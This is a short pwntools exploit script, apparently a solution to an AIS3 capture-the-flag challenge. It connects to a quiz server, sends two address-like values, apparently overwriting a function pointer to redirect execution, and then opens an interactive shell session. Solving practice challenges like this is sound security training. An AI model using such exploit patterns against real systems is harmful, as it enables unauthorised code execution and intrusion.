from pwn import *
from time import sleep
r = remote('quiz.ais3.org', 10102)
r.sendlineafter('s:','4210728')
#r.interactive()
#sleep(100)
r.sendlineafter('e:','4198576')
r.interactive()
